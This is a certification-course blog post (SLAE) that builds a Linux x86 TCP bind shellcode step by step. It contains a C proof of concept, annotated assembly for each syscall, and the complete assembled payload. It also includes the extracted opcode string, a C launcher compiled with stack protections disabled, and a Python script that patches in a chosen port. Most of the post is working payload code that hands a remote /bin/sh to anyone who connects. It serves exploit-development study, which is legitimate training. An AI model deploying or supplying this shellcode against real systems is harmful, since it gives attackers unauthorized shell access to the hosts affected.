---
layout: post
author: thesp0nge
title: "Assignment #1: Create a bind shellcode"
tags: [slae, shellcode, bind shellcode, assembler, i386]
comments: true
category: [slae]
share: true
order: 1
---

The first assignment for SLAE certification is to create a standard shell TCP
bind shellcode in assembler language. The shellcode will bind on a given port,
waiting for clients and spawn a shell on the incoming connection.

The binding port should be easily configurable.

The assignment was written on an Ubuntu Linux 18.04, with a Linux kernel 4.15
version.

## The POC

To start, I created a very simple PoC code written in C to solve the
assignment. As you can see it's a standard TCP mono process server performing
some very basic stuff:

* opens a socket
* binds the socket on a given port
* connects the socket
* listens for incoming connections
* accepts connections.

When a client connect on the shellcode port, the server redirects its standard
output, standard input and standard error on the socket descriptor and then
spawn the shell using execve() system call.

Please consider that when execve() it has been executed, the code in the
process text segment is substituted with the shell one, so there is no need for
an exit() call at the end of the PoC.

Please consider also that I removed all error checking code, in order to have
the shellcode as small as possible.

{% highlight c %}
/*
 * tcp_bind_shellcode_poc.c: binds on a given TCP port and spawn a shell
 * on incoming connections.
 *
 * BSD 2-Clause License
 *
 * Copyright (c) 2018, Paolo Perego
 * All rights reserved.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

// for socket(), bind(), accept() calls
#include <sys/types.h>
#define _GNU_SOURCE // for accept4
#include <sys/socket.h>
#include <netinet/in.h>

#define DPORT	4444

int main(int argc, char **argv) {
	int sfd, cfd;
	struct sockaddr_in my_addr;

	sfd = socket(AF_INET, SOCK_STREAM, 0);

	memset(&my_addr, 0, sizeof(struct sockaddr));

	my_addr.sin_family 	= AF_INET;
	my_addr.sin_port 	= htons(DPORT);
	my_addr.sin_addr.s_addr = INADDR_ANY;

	bind(sfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

	listen(sfd, 0);

	cfd = accept(sfd, NULL, NULL);

	dup2(cfd, 0);
	dup2(cfd, 1);
	dup2(cfd, 2);
	execve((const char *)"/bin/sh", NULL, NULL);
	return 0;
}
{% endhighlight %}

## PoC analysis

The shellcode has very few system calls to implement in our assembler code.
Before Linux kernel 4.3, every system calls in the network programming domain,
was multiplexed by socketcall() system call.

However, socketcall() was not available on every architecture, there is no such
as call in x86-64 or ARM processor where single system calls are available
instead.

Newer Linux kernel versions, for x86-32 architecture, introduced also separate
system calls to facilitates the creation of seccomp(2) filters that filter
sockets system calls and to have some performance boost.

Additionally, during system call opcode mapping, I've discovered that accept()
is not a real call itself, instead, it is a wrapper to accept4() call with the
latest parameter, flag, set to 0.

### socket()

The socket() system call it is used to create a communication endpoint, mapped
as a file descriptor accordingly to the Unix definition that everything is a
file.

Since we want to create a reliable TCP socket, we will set the socket type to
SOCK_STREAM and the domain to AF_INET, to support IPv4 protocols.

The last parameter, protocol, let us specify different protocols (if any)
available for the defined double <domain, type>. Setting it to 0, it will be up
to the Operating System to choose the default one.

{%highlight asm%}
; Creating the socket.
;
; int socket(int domain, int type, int protocol);
;
; socket() is defined as #define __NR_socket 359 on /usr/include/i386-linux-gnu/asm/unistd_32.h
; AF_INET is defined as 2 in /usr/include/i386-linux-gnu/bits/socket.h
; SOCK_STREAM is defined as 1 in /usr/include/i386-linux-gnu/bits/socket_type.h

; Zero-ing main registers

xor eax, eax
mov ebx, eax
mov ecx, eax
mov edx, eax

mov ax, 0x167 ; 359 in decimal
mov bl, 0x2
mov cl, 0x1

int 0x80      ; sfd = socket(AF_INET, SOCK_STREAM, 0);
mov ebx, eax  ; storing the socket descriptor into EBX for next syscall

{% endhighlight %}

Most of other system calls will have the socket descriptor as the first argument.
So it can be a wise decision to save the socket return value into EBX register,
so we don't need to use the stack to retrieve everytime that value.

### bind()

The opened socket will be bound to TCP port 4444 as default value, 0x5c11. The
system call bind(), as the second parameter, has a pointer to a (struct sockaddr)
data structure. In case of TCP communications, the structure to be used is
(struct sockaddr_in) that it is equal in size but with some fields useful for
TCP/IP sockets.

As we can see from the following code snippet, we say again the socket family
is an Internet IPv4 socket and that the process must bind itself on every
available IP address, e.g. 0.0.0.0 and the port should be 4444, written in
network byte order.

Intel X86 processors work in little-endian order, so with the least significant
bytes on the right of the registers, meanwhile network byte order stores values
with the least significant bytes on the left. htons() makes this translation
for us in C. In assembler, we must do this on our own.

Please note that, in order to have the port number easily configurable, we
created a python script changing the assembly value, managing endianess on an
higher level.

{% highlight c %}
memset(&my_addr, 0, sizeof(struct sockaddr));

my_addr.sin_family 	= AF_INET;
my_addr.sin_port 	= htons(DPORT);
my_addr.sin_addr.s_addr = INADDR_ANY;
{% endhighlight %}

The assembly code loading bind parameters and invoking system call is the
following.
{% highlight asm %}
; Binding the socket to 0.0.0.0 address at port 4444
;
; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
;
;
; bind() is defined as #define __NR_bind 361 on /usr/include/i386-linux-gnu/asm/unistd_32.h

xor eax, eax
mov ax, 0x169 		; 361 in decimal
xor ecx, ecx
push ecx 		      ; pushing 32 bit INADDR_ANY
push word 0x5c11	; pushing PORT 4444 in network byte order
push word 0x2		  ; pushing AF_INET as sin_family

mov ecx, esp		; now ECX points to the my_addr data structure
mov dl, 0x10		; sizeof(my_addr) = 16 bytes
int 0x80		; bind(sfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
{%endhighlight%}

In this code, for safety reason I initialized EAX back to 0 however, this is
useless. EAX would be always zero in every calls, except the first socket() and
this bind(), if the previous one complete successfully. As a further
optimization, since there is no error check, we can strip down every 'xor eax,
eax' from all calls later this bind.

However, to obtain a clear and understandable code, I decided to let the init
to 0 code back.

### listen()

After binding a TCP socket on a given port, we must call listen() to say the
operating system, that descriptor will be used to accept incoming connections.

The listen call, along with the socket descript as the first argument, accepts an
integer parameter saying how many connections the socket will handle as its
backlog. In our case, the backlog is zero.

{%highlight asm%}
; Listening on opened socket bound to port 4444
;
; int listen(int sockfd, int backlog);
;
; listen() is defined as #define __NR_listen 363 in /usr/include/i386-linux-gnu/asm/unistd_32.h
xor ecx, ecx
xor eax, eax
mov ax, 0x16b		; 363 in decimal
int 0x80		; listen(sfd, 0);
{%endhighlight%}

## accept()

Handling accept was a little trickier. The original PoC code, was the following:
{%highlight c%}
cfd = accept(sfd, NULL, NULL);
{%endhighlight%}

On the listening socket descriptor, we will call accept() call, having the
process to block itself waiting for incoming connections.

The call prototype is the following, where addr and addrlen are pointers to
data structures storing information about our peer. Since we don't care about
managing incoming connection IP address or TCP port, we pass accept NULL
pointers.

{%highlight c%}
int accept(int socket, struct sockaddr *addr, socklen_t *addrlen);
{%endhighlight%}

However, *there is no* accept() system call defined in Linux Kernel. There is
instead, an accept4() system call, with the same arguments and with a fourth
parameter, an integer that can be used to specify two different options for the
socket (you will have to OR them together if you want to set both):

* SOCK_NOBLOCK: saying the process must not blocking itself waiting for
  connections;
* SOCK_CLOEXEC: saying the socket descriptor must be closed when the process
  dies.

Since we do want the socket to be blocking and since the subsequent execve()
call will overwrite our process text segment it will be useless to say we want
to close that descriptor. When execve() call will terminate, the process will
die and the operating system will free all allocated resources.

If flags is set to 0, as in our case and as manual page, the accept4 call is
the same as the accept, so our PoC code will result in:

{%highlight c%}
cfd = accept4(sfd, NULL, NULL, 0);
{%endhighlight%}

In the source code preamble, right before including socket.h, we have to define
_GNU_SOURCE macro to say the compiler we are on Linux and we want to enable
accept4() call. Please note that on other operating systems there is no
accept4(), so this assembler code must be changed accordingly if we want to
port on other systems.

In assembly, everything is turned in the following code. EBX is still storing
socket descriptor, so there is no need to touch it.

ECX is set to 0 since the previous bind, so we push it on the stack in order to
have a NULL area and we pass the call the pointer on that area, pushing the ESP
register on ECX and EDX.

ESI register is used to handle the fourth parameter and it is set to 0.

{%highlight asm%}
; Accepting incoming connection on listening socket
;
; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
;
; accept() is not defined as syscall in /usr/include/i386-linux-gnu/asm/unistd_32.h.
; Instead accept4() is defined as #define __NR_accept4 364.
;
; From the man page, accept4() has the followint prototype:
; int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
;
; The last integer, as from the man page, if set to 0 makes the
; accept4() call to behave as the same as the accept()

xor eax, eax
mov ax, 0x16c		; 364 in decimal

push ecx		; ECX is 0, pushing on the stack

mov esi, ecx
mov ecx, esp		; ECX now points to a zero bytes region from the stack.
mov edx, esp

int 0x80		; cfd = accept4(sfd, NULL, NULL, 0);

mov ebx, eax		; Saving socket descript resulting from accept4 into EBX
{%endhighlight%}

accept() call returns the socket descriptor resulting of the newly accepted
communication. Since the original socket descriptor is not going to be used
anymore, we save on EBX register the new descriptor and we move forward.

### dup()

Before giving the control to execve() we must redirect standard input, output,
and error to the newly accepted socket descriptor. This way, we will create a
bi-directional data flow mechanism to the socket and to the execve().

We will use the dup2() system call to achieve this. Its task is to duplicate
the descriptor specified as then second argument to the one passed as the first
argument.

{%highlight c%}
dup2(cfd, 0);
dup2(cfd, 1);
dup2(cfd, 2);
{%endhighlight%}

Nothing complicated here. I just use a loop in order not to duplicate a lot of
code and also to practice me with jump instructions.

{%highlight asm%}
; Duplicating descriptor 0, 1, 2 to the socket opened by client
;
; int dup2(int oldfd, int newfd);
;
; dup2 is defined as #define __NR_dup2 63 in /usr/include/i386-linux-gnu/asm/unistd_32.h

xor ecx, ecx
mov cl,  2
xor eax, eax

dup2:
	mov al, 0x3F	; 63 in decimal
	int 0x80	; duplicating file descriptors in backwards order; from 2 to 0
	dec ecx
	jns dup2
{%endhighlight%}

### And the final call: execve()

Ok, if everything was set correctly we have a listening socket and our process
has its standard input, output and error redirected on that socket. It's now
time to spawn a shell.

The shell we're going to invoke using execve() system call will inherit the
duplicated descriptors, so any flow will be on the accepted socket.

Our PoC here is very simple. execve() call has three parameters:

{%highlight c%}
int execve(const char *path, char *const argv[], char *const envp[]);
{%endhighlight%}

The first parameter is the executable to be executed, the second parameter is
the pointer of the parameter list and the third parameter is a pointer to the
list of the environmental variables to be used by our executable.

In our case, we don't need to pass command line argument or environmental
variables to our shell, therefore, we can easily pass NULL pointers.

{%highlight c%}
execve((const char *)"/bin/sh", NULL, NULL);
{%endhighlight%}

In assembler everythins is translated as:

{%highlight asm%}
; Executing shell
;
; int execve(const char *filename, char *const argv[], char *const envp[]);
; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h

xor eax, eax
push eax	; The NULL byte
push 0x68732f2f ; "sh//". The second '\' is used to align our command into the stack
push 0x6e69622f ; "nib/"
mov ebx, esp	; EBX now points to "/bin//sh"

xor ecx, ecx
xor edx, edx
mov al, 0xB	; 11 in decimal
int 0x80

{%endhighlight%}

## My helper programs

The compile script shell:

{% highlight sh %}
#!/bin/bash

# This is the compile helper. I modified a bit, just
# to detect the file extension and call nasm or gcc
# accordingly.

dirname=$(dirname -- "$1")
filename=$(basename -- "$1")
extension="${filename##*.}"
filename="${filename%.*}"

echo "[*] Compiling $filename"

if [ "$extension" = "c" ]; then
	echo "[+] Calling gcc without stack protection"
	gcc -fno-stack-protector -z execstack $1 -o $dirname/$filename
fi

if [ "$extension" = "nasm" ]; then

	echo '[+] Assembling with Nasm ... '
	nasm -f elf32 -o $dirname/$filename.o $1

	echo '[+] Linking ...'
	ld -o $dirname/$filename $dirname/$filename.o

	echo '[+] Done!'
fi
{% endhighlight %}

The script to dump the shellcode from the compiled binary:

{% highlight sh %}
#!/bin/sh

dirname=$(dirname -- "$1")
filename=$(basename -- "$1")
extension="${filename##*.}"
filename="${filename%.*}"

OBJDUMP=`which objdump`


if ! [ -x $OBJDUMP ]; then
	echo "[!] there is no objdump installed on the system. I can't continue."
	exit 1
fi

$OBJDUMP -d $dirname/$filename |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

{% endhighlight %}


## The assembly code

Putting all pieces together, this is the first assignment solution in assembler.

{% highlight assembly %}
; Filename: 	tcp_bind_shellcode_light.nasm
; Author:	    Paolo Perego <paolo@codiceinsicuro.it>
; Website:  	https://codiceinsicuro.it
; Twitter:    @thesp0nge
; SLAE-ID:    1217
; Purpose: binds on TCP port 4444 and spawn a shell on incoming connections.


global _start

section .text

_start:
	; Creating the socket.
	;
	; int socket(int domain, int type, int protocol);
	;
	; socket() is defined as #define __NR_socket 359 on /usr/include/i386-linux-gnu/asm/unistd_32.h
	; AF_INET is defined as 2 in /usr/include/i386-linux-gnu/bits/socket.h
	; SOCK_STREAM is defined as 1 in /usr/include/i386-linux-gnu/bits/socket_type.h
	xor eax, eax
	mov ebx, eax
	mov ecx, eax
	mov edx, eax

	mov ax, 0x167 ; 359 in decimal
	mov bl, 0x2
	mov cl, 0x1

	int 0x80 ; sfd = socket(AF_INET, SOCK_STREAM, 0);
	mov ebx, eax ; storing the socket descriptor into EBX for next syscall

	;push eax ; save socket descriptor into the stack

	; Binding the socket to 0.0.0.0 address at port 4444
	;
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	;
	;
	; bind() is defined as #define __NR_bind 361 on /usr/include/i386-linux-gnu/asm/unistd_32.h

	xor eax, eax
	mov ax, 0x169 		; 361 in decimal
	xor ecx, ecx
	push ecx 		      ; pushing 32 bit INADDR_ANY
	push word 0x5c11	; pushing PORT 4444 in network byte order
	push word 0x2		  ; pushing AF_INET as sin_family

	mov ecx, esp		; now ECX points to the my_addr data structure
	mov dl, 0x10		; sizeof(my_addr) = 16 bytes
	int 0x80		; bind(sfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

	; Listening on opened socket bound to port 4444
	;
	; int listen(int sockfd, int backlog);
	;
	; listen() is defined as #define __NR_listen 363 in /usr/include/i386-linux-gnu/asm/unistd_32.h
	xor ecx, ecx
	xor eax, eax
	mov ax, 0x16b		; 363 in decimal
	int 0x80		; listen(sfd, 0);

	; Accepting incoming connection on listening socket
	;
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	;
	; accept() is not defined as syscall in /usr/include/i386-linux-gnu/asm/unistd_32.h.
	; Instead accept4() is defined as #define __NR_accept4 364.
	;
	; From the man page, accept4() has the followint prototype:
	; int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
	;
	; The last integer, as from the man page, if set to 0 makes the
	; accept4() call to behave as the same as the accept()

	xor eax, eax
	mov ax, 0x16c		; 364 in decimal

	push ecx		; ECX is 0, pushing on the stack

	mov esi, ecx
	mov ecx, esp		; ECX now points to a zero bytes region from the stack.
	mov edx, esp

	int 0x80		; cfd = accept4(sfd, NULL, NULL, 0);

	mov ebx, eax		; Saving socket descript resulting from accept4 into EBX

	; Duplicating descriptor 0, 1, 2 to the socket opened by client
	;
	; int dup2(int oldfd, int newfd);
	;
	; dup2 is defined as #define __NR_dup2 63 in /usr/include/i386-linux-gnu/asm/unistd_32.h

	xor ecx, ecx
	mov cl,  2
	xor eax, eax

dup2:
	mov al, 0x3F	; 63 in decimal
	int 0x80	; duplicating file descriptors in backwards order; from 2 to 0
	dec ecx
	jns dup2

	; Executing shell
	;
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h

	xor eax, eax
	push eax	; The NULL byte
	push 0x68732f2f ; "sh//". The second '\' is used to align our command into the stack
	push 0x6e69622f ; "nib/"
	mov ebx, esp	; EBX now points to "/bin//sh"

	xor ecx, ecx
	xor edx, edx
	mov al, 0xB	; 11 in decimal
	int 0x80


{% endhighlight %}

After having compiled the assembler source file with compile.sh script shell, I used scdump.sh script to dump the shellcode.

{%highlight sh %}
"\x31\xc0\x89\xc3\x89\xc1\x89\xc2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x31\xc0\x66\xb8\x69\x01\x31\xc9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc9\x31\xc0\x66\xb8\x6b\x01\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x51\x89\xce\x89\xe1\x89\xe2\xcd\x80\x89\xc3\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
{%endhighlight %}

I added this shellcode into a C program, trying to execute it in order to check the payload is correct.

{%highlight c%}
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x89\xc3\x89\xc1\x89\xc2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x31\xc0\x66\xb8\x69\x01\x31\xc9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc9\x31\xc0\x66\xb8\x6b\x01\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x51\x89\xce\x89\xe1\x89\xe2\xcd\x80\x89\xc3\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
{%endhighlight%}

Please note that compile.sh script uses -fno-stack-protector -z execstack flags
in order to disable stack protection mechanisms in Linux Operating System.


## The configurator

Last bits. Our shellcode implements a bind shell code on port 4444 (\xc9\x51 in
hexadecimal and network byte order), which is hardcoded.

The assignment asked the target port to be easily configurable, that's why I
created a python script to do this.

{% highlight python %}
#!/usr/bin/env python

import sys, socket;

if (len(sys.argv) == 1):
    port = 4444
else:
    port = int(sys.argv[1])

if port < 1024 or port > 65535:
    print "[!] invalid TCP port number: " + str(port)
    sys.exit(-1)

no_port = socket.htons(port);
hex_no_port = hex(no_port)

h1 = hex_no_port[2:4]
h2 = hex_no_port[4:6]

if h1 == "":
    h1 = "00"

if len(h1) == 1:
    h1 = "0" + h1

if h2 == "":
    h2 = "00"

if len(h2) == 1:
    h2 = "0" + h2

hex_port_number = "\\x%s\\x%s" % (h2, h1)

light_shellcode="\\x31\\xc0\\x89\\xc3\\x89\\xc1\\x89\\xc2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x66\\xb8\\x69\\x01\\x31\\xc9\\x51\\x66\\x68" + hex_port_number + "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc9\\x31\\xc0\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x51\\x89\\xce\\x89\\xe1\\x89\\xe2\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80";

print light_shellcode

{% endhighlight %}

Using this python script is very easy. Just pass the required port number as
the parameter and it will give the resulting shellcode for us. The script
checks for port number to be in between 1024 and 65535 and it deals with
network byte order and hexadecimal encoding.

## Code in action

After completed the assembler, it's time to run. I compiled the code using the
compile.sh helper and run it. As you can see from the following video the 4444
port is opened and a shell was successfully spawned when connecting using
netcat tool.


Using scdump.sh helper, I extracted the shellcode from the binary tool and
inserted in the shellcode.c helper program.

{% highlight c %}
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"SHELLCODE";

int main(int argc, char **argv)
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
{% endhighlight %}

As you can see from the video, after compiling the C code, disabling stack
protection and run it, the 4444 TCP port it has been opened and a shell
successfully spawned when connecting to it.


Now it's time to change the PORT. For such a reason, I'm going to use the
python script providing a different port number, 5555 in this case. I pasted
the obtained shellcode into the C launcher, compile it, run it and as you can
see everything works as expected and a shell is spawned when connecting to port 5555.


## SLAE Exam Statement

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1217
